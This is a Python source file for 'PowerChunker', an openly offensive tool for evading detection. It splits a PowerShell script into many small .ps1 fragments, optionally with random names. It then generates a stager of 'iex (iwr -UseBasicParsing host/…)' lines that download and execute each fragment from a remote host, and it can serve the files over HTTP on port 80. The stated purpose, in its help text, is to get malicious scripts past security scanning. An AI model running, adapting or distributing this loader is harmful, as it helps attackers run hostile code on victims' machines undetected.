#!/usr/bin/env python3
import http.server
import socketserver
import argparse
import sys
import secrets
import string

inspiration = """
/\\     __    PowerChunker.py!!!            
  \\ .-':::.         (by @icyguider)                       
   \\ :::::|\\                              
  |,\\:::'/  \\     why is there hamburger? 
  `.:::-'    \\                             
    `-.       \\         ___                
       `-.     |     .-'';:::.              
          `-.-'     / ',''.;;;\\            
                   |  ','','.''|            
              AsH  |\\  ' ,',' /'           
                   `.`-.___.-;'             
                     `--._.-'                                                           
"""


def generate_name(alphabet, length=12, exclude=None):
    if exclude is None:
        exclude = []
    name = "".join(secrets.choice(alphabet) for i in range(length))
    while name in exclude:
        name = "".join(secrets.choice(alphabet) for i in range(length))
    return name


def main(filename, host, outdir, stagername, serve, randomize):
    alphabet = string.ascii_letters + string.digits
    f = open(filename, "r")
    sample = f.readlines()
    f.close()

    real = []
    multiline = False

    count = 1
    names = []
    for line in sample:
        # line = line.strip("\n")
        if '@"' in line:
            multiline = True
        if '"@' in line:
            real.append(line)
            multiline = False
            done = "".join(real)
            if randomize:
                name = generate_name(alphabet=alphabet, exclude=names)
                names.append(name)
            else:
                name = count
            with open("{}{}.ps1".format(outdir, name), "w+") as f:
                f.write(done)     
            count += 1
        if multiline == True:
            real.append(line)
        if multiline == False:
            if '"@' not in line:
                if randomize:
                    name = generate_name(alphabet=alphabet, exclude=names)
                    names.append(name)
                else:
                    name = count
                with open("{}{}.ps1".format(outdir, name), "w+") as f:
                    f.write(line)
                count += 1

    print("[+] Powershell script has been split into {} files...".format(count - 1))

    stager = []
    for x in names if randomize else range(1, count):
        stager.append("iex (iwr -UseBasicParsing {}/{}.ps1)\n".format(host, x))

    with open("{}{}".format(outdir, stagername), "w+") as f:
        f.write("".join(stager))

    print(
        "[!] PowerChunker Stager written to: {}{}\n    Execute like so: iex (iwr -UseBasicParsing {}/{})".format(
            outdir, stagername, host, stagername
        )
    )

    if serve is True:
        PORT = 80
        Handler = http.server.SimpleHTTPRequestHandler
        with socketserver.TCPServer(("", PORT), Handler) as httpd:
            print("[+] Serving at port:", PORT)
            httpd.serve_forever()


print(inspiration)
parser = argparse.ArgumentParser(
    description="Split a powershell script to evade detection!"
)
parser.add_argument("file", help="Name of powershell script to chunk", type=str)
parser.add_argument(
    "host",
    help="Domain Name or IP Address of host that will serve stager, with scheme",
    type=str,
)
parser.add_argument(
    "-d",
    "--dir",
    dest="dir",
    help="Directory to write results to (Optional)",
    default="./",
)
parser.add_argument(
    "-s",
    "--serve",
    dest="serve",
    help="Start HTTP Server to host stager (Optional)",
    default=False,
    action="store_true",
)
parser.add_argument(
    "-o",
    "--out",
    dest="out",
    help="Name of final stager (Optional)",
    metavar="stager.ps1",
    default="chunker.ps1",
)
parser.add_argument(
    "-r",
    "--random",
    dest="random",
    help="Randomize output filenames (except final stager)",
    action="store_true",
)
if len(sys.argv) < 3:
    parser.print_help()
    sys.exit()
args = parser.parse_args()
if not args.dir.endswith("/"):
    args.dir += "/"
assert args.host.startswith("http"), "Host must contain scheme  (like http://)"
try:
    if len(sys.argv) > 3:
        if args.file is None or args.host is None or args.serve is None:
            raise Exception()
        else:
            main(args.file, args.host, args.dir, args.out, args.serve, args.random)
    else:
        main(args.file, args.host, args.dir, args.out, args.serve, args.random)
except:
    sys.exit()
